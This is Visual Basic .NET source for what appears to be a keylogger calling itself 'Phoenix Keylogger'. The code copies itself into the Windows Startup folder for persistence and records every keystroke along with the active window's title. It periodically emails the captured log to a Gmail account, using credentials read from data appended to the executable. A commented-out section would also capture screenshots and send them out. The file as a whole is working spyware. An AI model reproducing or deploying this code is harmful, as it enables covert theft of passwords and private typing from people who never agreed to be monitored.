Imports System.IO
Imports System.Net.Mail
Public Class Form1



    Private Declare Function GetActiveWindow Lib "user32" () As Long
    Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr
    Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Private Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
    Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Integer, ByVal dwExtraInfo As Integer)
    Private Const VK_SNAPSHOT As Short = &H2CS




    Dim result As Integer
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Dim options(), text1, text2 As String
    Const FileSplit = "@phoenix@"
    Dim str As String = IO.Path.GetFileName(Application.ExecutablePath)
    Dim vDirectory As String
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        FileGet(1, text1)
        FileGet(1, text2)
        FileClose(1)
        options = Split(text1, FileSplit)
        TextBox2.Text = options(1)
        TextBox3.Text = options(2)
        vDirectory = "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
        Dim zDir As New DirectoryInfo(vDirectory)
        If Not zDir.Exists Then
            My.Computer.FileSystem.CopyFile(Application.ExecutablePath, "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" & str, True)
        Else
            My.Computer.FileSystem.CopyFile(Application.ExecutablePath, "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\" & str, True)
        End If
        Timer1.Start()
        Timer2.Start()
        Timer3.Start()
    End Sub


    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
 
        'Me.Hide()
        Dim hWnd As IntPtr = GetForegroundWindow()

        If hWnd = IntPtr.Zero Then Exit Sub

        Dim TitleLength As Integer

        TitleLength = GetWindowTextLength(hWnd)

        Dim WindowTitle As String = StrDup(TitleLength + 1, "*")

        GetWindowText(hWnd, WindowTitle, TitleLength + 1)

        Dim pid As Integer = 0

        GetWindowThreadProcessId(hWnd, pid)

        If pid = 0 Then Exit Sub

        Dim proc As Process = Process.GetProcessById(pid)

        If proc Is Nothing Then Exit Sub

        Dim txtProcessID = pid.ToString

        Dim txtProcessName = proc.ProcessName

        Dim txtProcessTitle = proc.MainWindowTitle

        Dim txtCurrentWindowTitle = WindowTitle

        Dim txtTitleLength = TitleLength.ToString

        For i = 1 To 130
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                If (GetAsyncKeyState(107)) Then
                    TextBox1.Text = TextBox1.Text + "+"

                ElseIf (GetAsyncKeyState(59)) Then
                    TextBox1.Text = TextBox1.Text + ";"

                ElseIf (GetAsyncKeyState(95)) Then
                    TextBox1.Text = TextBox1.Text + "_"

                ElseIf (GetAsyncKeyState(95)) Then
                    TextBox1.Text = TextBox1.Text + "_"

                ElseIf (GetAsyncKeyState(59)) Then
                    TextBox1.Text = TextBox1.Text + ";"

                ElseIf (GetAsyncKeyState(58)) Then
                    TextBox1.Text = TextBox1.Text + ":"

                ElseIf (GetAsyncKeyState(47)) Then
                    TextBox1.Text = TextBox1.Text + "/"

                ElseIf (GetAsyncKeyState(63)) Then
                    TextBox1.Text = TextBox1.Text + "?"

                ElseIf (GetAsyncKeyState(64)) Then
                    TextBox1.Text = TextBox1.Text + "@"

                ElseIf (GetAsyncKeyState(126)) Then
                    TextBox1.Text = TextBox1.Text + "~"

                ElseIf (GetAsyncKeyState(35)) Then
                    TextBox1.Text = TextBox1.Text + "#"

                ElseIf (GetAsyncKeyState(44)) Then
                    TextBox1.Text = TextBox1.Text + ","

                ElseIf (GetAsyncKeyState(60)) Then
                    TextBox1.Text = TextBox1.Text + "<"

                ElseIf (GetAsyncKeyState(62)) Then
                    TextBox1.Text = TextBox1.Text + ">"

                ElseIf (GetAsyncKeyState(124)) Then
                    TextBox1.Text = TextBox1.Text + "|"

                ElseIf (GetAsyncKeyState(48)) Then
                    TextBox1.Text = TextBox1.Text + "0"

                ElseIf (GetAsyncKeyState(49)) Then
                    TextBox1.Text = TextBox1.Text + "1"

                ElseIf (GetAsyncKeyState(50)) Then
                    TextBox1.Text = TextBox1.Text + "2"

                ElseIf (GetAsyncKeyState(51)) Then
                    TextBox1.Text = TextBox1.Text + "3"

                ElseIf (GetAsyncKeyState(52)) Then
                    TextBox1.Text = TextBox1.Text + "4"

                ElseIf (GetAsyncKeyState(53)) Then
                    TextBox1.Text = TextBox1.Text + "5"

                ElseIf (GetAsyncKeyState(54)) Then
                    TextBox1.Text = TextBox1.Text + "6"

                ElseIf (GetAsyncKeyState(55)) Then
                    TextBox1.Text = TextBox1.Text + "7"

                ElseIf (GetAsyncKeyState(56)) Then
                    TextBox1.Text = TextBox1.Text + "8"

                ElseIf (GetAsyncKeyState(57)) Then
                    TextBox1.Text = TextBox1.Text + "9"

                ElseIf (GetAsyncKeyState(65)) Then
                    TextBox1.Text = TextBox1.Text + "a"

                ElseIf (GetAsyncKeyState(66)) Then
                    TextBox1.Text = TextBox1.Text + "b"

                ElseIf (GetAsyncKeyState(67)) Then
                    TextBox1.Text = TextBox1.Text + "c"

                ElseIf (GetAsyncKeyState(68)) Then
                    TextBox1.Text = TextBox1.Text + "d"

                ElseIf (GetAsyncKeyState(69)) Then
                    TextBox1.Text = TextBox1.Text + "e"

                ElseIf (GetAsyncKeyState(70)) Then
                    TextBox1.Text = TextBox1.Text + "f"

                ElseIf (GetAsyncKeyState(71)) Then
                    TextBox1.Text = TextBox1.Text + "g"

                ElseIf (GetAsyncKeyState(72)) Then
                    TextBox1.Text = TextBox1.Text + "h"

                ElseIf (GetAsyncKeyState(73)) Then
                    TextBox1.Text = TextBox1.Text + "i"

                ElseIf (GetAsyncKeyState(74)) Then
                    TextBox1.Text = TextBox1.Text + "j"

                ElseIf (GetAsyncKeyState(75)) Then
                    TextBox1.Text = TextBox1.Text + "k"

                ElseIf (GetAsyncKeyState(76)) Then
                    TextBox1.Text = TextBox1.Text + "l"

                ElseIf (GetAsyncKeyState(77)) Then
                    TextBox1.Text = TextBox1.Text + "m"

                ElseIf (GetAsyncKeyState(78)) Then
                    TextBox1.Text = TextBox1.Text + "n"

                ElseIf (GetAsyncKeyState(79)) Then
                    TextBox1.Text = TextBox1.Text + "o"

                ElseIf (GetAsyncKeyState(80)) Then
                    TextBox1.Text = TextBox1.Text + "p"

                ElseIf (GetAsyncKeyState(81)) Then
                    TextBox1.Text = TextBox1.Text + "q"

                ElseIf (GetAsyncKeyState(82)) Then
                    TextBox1.Text = TextBox1.Text + "r"

                ElseIf (GetAsyncKeyState(83)) Then
                    TextBox1.Text = TextBox1.Text + "s"

                ElseIf (GetAsyncKeyState(84)) Then
                    TextBox1.Text = TextBox1.Text + "t"

                ElseIf (GetAsyncKeyState(85)) Then
                    TextBox1.Text = TextBox1.Text + "u"

                ElseIf (GetAsyncKeyState(86)) Then
                    TextBox1.Text = TextBox1.Text + "v"

                ElseIf (GetAsyncKeyState(87)) Then
                    TextBox1.Text = TextBox1.Text + "w"

                ElseIf (GetAsyncKeyState(88)) Then
                    TextBox1.Text = TextBox1.Text + "x"

                ElseIf (GetAsyncKeyState(89)) Then
                    TextBox1.Text = TextBox1.Text + "y"

                ElseIf (GetAsyncKeyState(90)) Then
                    TextBox1.Text = TextBox1.Text + "z"

                ElseIf (GetAsyncKeyState(8)) Then
                    TextBox1.Text = TextBox1.Text + "[Back]"

                ElseIf (GetAsyncKeyState(27)) Then
                    TextBox1.Text = TextBox1.Text + "[Esc]"

                ElseIf (GetAsyncKeyState(35)) Then
                    TextBox1.Text = TextBox1.Text + "[End]"

                ElseIf (GetAsyncKeyState(33)) Then
                    TextBox1.Text = TextBox1.Text + "[PageUp]"

                ElseIf (GetAsyncKeyState(34)) Then
                    TextBox1.Text = TextBox1.Text + "[Pagedown]"

                ElseIf (GetAsyncKeyState(36)) Then
                    TextBox1.Text = TextBox1.Text + "[Home]"

                ElseIf (GetAsyncKeyState(37)) Then
                    TextBox1.Text = TextBox1.Text + "[Left]"

                ElseIf (GetAsyncKeyState(38)) Then
                    TextBox1.Text = TextBox1.Text + "[Up]"

                ElseIf (GetAsyncKeyState(39)) Then
                    TextBox1.Text = TextBox1.Text + "[Right]"

                ElseIf (GetAsyncKeyState(40)) Then
                    TextBox1.Text = TextBox1.Text + "[Down]"

                ElseIf (GetAsyncKeyState(45)) Then
                    TextBox1.Text = TextBox1.Text + "[Ins]"

                ElseIf (GetAsyncKeyState(46)) Then
                    TextBox1.Text = TextBox1.Text + "[Del]"

                ElseIf (GetAsyncKeyState(144)) Then
                    TextBox1.Text = TextBox1.Text + "[NumLock]"

                ElseIf (GetAsyncKeyState(112)) Then
                    TextBox1.Text = TextBox1.Text + "[F1]"

                ElseIf (GetAsyncKeyState(113)) Then
                    TextBox1.Text = TextBox1.Text + "[F2]"

                ElseIf (GetAsyncKeyState(114)) Then
                    TextBox1.Text = TextBox1.Text + "[F3]"

                ElseIf (GetAsyncKeyState(115)) Then
                    TextBox1.Text = TextBox1.Text + "[F4]"

                ElseIf (GetAsyncKeyState(116)) Then
                    TextBox1.Text = TextBox1.Text + "[F5]"

                ElseIf (GetAsyncKeyState(117)) Then
                    TextBox1.Text = TextBox1.Text + "[F6]"

                ElseIf (GetAsyncKeyState(118)) Then
                    TextBox1.Text = TextBox1.Text + "[F7]"

                ElseIf (GetAsyncKeyState(119)) Then
                    TextBox1.Text = TextBox1.Text + "[F8]"

                ElseIf (GetAsyncKeyState(120)) Then
                    TextBox1.Text = TextBox1.Text + "[F9]"

                ElseIf (GetAsyncKeyState(121)) Then
                    TextBox1.Text = TextBox1.Text + "[F10]"

                ElseIf (GetAsyncKeyState(122)) Then
                    TextBox1.Text = TextBox1.Text + "[F11]"

                ElseIf (GetAsyncKeyState(123)) Then
                    TextBox1.Text = TextBox1.Text + "[F12]"

                ElseIf (GetAsyncKeyState(16)) Then
                    TextBox1.Text = TextBox1.Text + "[Shift]"

                ElseIf (GetAsyncKeyState(96)) Then
                    TextBox1.Text = TextBox1.Text + "0"

                ElseIf (GetAsyncKeyState(97)) Then
                    TextBox1.Text = TextBox1.Text + "1"

                ElseIf (GetAsyncKeyState(98)) Then
                    TextBox1.Text = TextBox1.Text + "2"

                ElseIf (GetAsyncKeyState(99)) Then
                    TextBox1.Text = TextBox1.Text + "3"

                ElseIf (GetAsyncKeyState(100)) Then
                    TextBox1.Text = TextBox1.Text + "4"

                ElseIf (GetAsyncKeyState(101)) Then
                    TextBox1.Text = TextBox1.Text + "5"

                ElseIf (GetAsyncKeyState(102)) Then
                    TextBox1.Text = TextBox1.Text + "6"

                ElseIf (GetAsyncKeyState(103)) Then
                    TextBox1.Text = TextBox1.Text + "7"

                ElseIf (GetAsyncKeyState(104)) Then
                    TextBox1.Text = TextBox1.Text + "8"

                ElseIf (GetAsyncKeyState(105)) Then
                    TextBox1.Text = TextBox1.Text + "9"

                ElseIf (GetAsyncKeyState(106)) Then
                    TextBox1.Text = TextBox1.Text + "*"

                ElseIf (GetAsyncKeyState(108)) Then
                    TextBox1.Text = TextBox1.Text + "" & vbCrLf
                    TextBox1.Text = TextBox1.Text + "[" + txtProcessTitle + "]"
                ElseIf (GetAsyncKeyState(32)) Then
                    TextBox1.Text = TextBox1.Text + " "

                ElseIf (GetAsyncKeyState(109)) Then
                    TextBox1.Text = TextBox1.Text + "-"


                ElseIf (GetAsyncKeyState(110)) Then
                    TextBox1.Text = TextBox1.Text + "."

                ElseIf (GetAsyncKeyState(111)) Then
                    TextBox1.Text = TextBox1.Text + "/"

                ElseIf (GetAsyncKeyState(42)) Then
                    TextBox1.Text = TextBox1.Text + "[PrintScreen]"

                ElseIf (GetAsyncKeyState(43)) Then
                    TextBox1.Text = TextBox1.Text + "[Execute]"

                ElseIf (GetAsyncKeyState(43)) Then
                    TextBox1.Text = TextBox1.Text + "[Snapshot]"

                ElseIf (GetAsyncKeyState(41)) Then
                    TextBox1.Text = TextBox1.Text + "[Select]"

                ElseIf (GetAsyncKeyState(19)) Then
                    TextBox1.Text = TextBox1.Text + "[Pause]"

                ElseIf (GetAsyncKeyState(20)) Then
                    TextBox1.Text = TextBox1.Text + "[CapsLock]"

                ElseIf (GetAsyncKeyState(17)) Then
                    TextBox1.Text = TextBox1.Text + "[Ctrl]"

                ElseIf (GetAsyncKeyState(13)) Then
                    TextBox1.Text = TextBox1.Text + "" & vbCrLf
                    TextBox1.Text = TextBox1.Text + "[" + txtProcessTitle + "]"
                ElseIf (GetAsyncKeyState(9)) Then
                    TextBox1.Text = TextBox1.Text + "[Tab]"

                ElseIf (GetAsyncKeyState(12)) Then
                    TextBox1.Text = TextBox1.Text + "[Clear]"

                ElseIf (GetAsyncKeyState(3)) Then
                    TextBox1.Text = TextBox1.Text + "[Cancel]"

                End If
            End If
        Next i
    End Sub




    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick

        Dim Usrname As String
        Dim MyMailMessage As New MailMessage
        Usrname = Environment.UserName.ToString
        MyMailMessage.From = New MailAddress(TextBox2.Text)
        MyMailMessage.To.Add(TextBox2.Text)
        MyMailMessage.Subject = (".:Phoenix Keylogger:. Logs of " & Usrname)
        MyMailMessage.Body = TextBox1.Text
        Dim SMTPServer As New SmtpClient("smtp.gmail.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential(TextBox2.Text, TextBox3.Text)
        SMTPServer.EnableSsl = True
        SMTPServer.Send(MyMailMessage)
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        TextBox1.Clear()
    End Sub

    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        'Dim ScreenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        'Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        'Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(screenGrab)
        'g.CopyFromScreen(New Point(0, 0), New Point(0, 0), ScreenSize)
        'screenGrab.Save("C:\Documents and Settings\All Users\Application Data\12321gdf5.jpeg")
        'End

        'Dim MyMailMessage As New MailMessage
        'Dim MsgAttachment As New Attachment("C:\Documents and Settings\All Users\Application Data\12321gdf5.jpeg")
        'MyMailMessage.From = New MailAddress(TextBox2.Text)
        'MyMailMessage.To.Add(TextBox2.Text)
        'MyMailMessage.Subject = "SCREENSHOT" & System.Environment.UserName
        'MyMailMessage.Attachments.Add(MsgAttachment)
        'Dim SMTP As New SmtpClient("smtp.gmail.com")
        'SMTP.Port = 587
        'SMTP.EnableSsl = True
        'SMTP.Credentials = New System.Net.NetworkCredential(TextBox2.Text, TextBox3.Text)
        'SMTP.EnableSsl = True
        'SMTP.Send(MyMailMessage)
    End Sub
End Class
